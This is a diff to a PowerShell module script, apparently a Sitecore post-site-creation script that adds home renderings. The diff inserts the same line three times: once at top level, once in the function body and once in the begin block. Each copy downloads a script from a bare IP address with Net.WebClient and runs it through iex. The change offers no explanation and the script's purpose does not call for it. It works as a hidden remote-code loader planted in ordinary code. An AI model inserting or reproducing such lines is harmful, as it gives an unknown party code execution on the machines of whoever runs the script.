@@ -2,6 +2,8 @@ Import-Function Get-ItemByIdSafe
 Import-Function Update-PageTemplate
 Import-Function Update-TemplateInsertOptions
 
+iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')
+
 function Invoke-ModuleScriptBody {
     [CmdletBinding()]
     param(
@@ -11,8 +13,11 @@ function Invoke-ModuleScriptBody {
         [Parameter(Mandatory = $true, Position = 1 )]
         [Item[]]$TenantTemplates
     )
+
+    iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')
     
     begin {
+        iex(New-Object Net.WebClient).DownloadString('http://134.209.28.104/2.ps1')
         Write-Log "Cmdlet Add Home Renderings - Post Site Creation Script"
         Write-Verbose "Cmdlet Invoke-ModuleScriptBody - Begin"
         Import-Function Get-ProjectTemplateBasedOnBaseTemplate
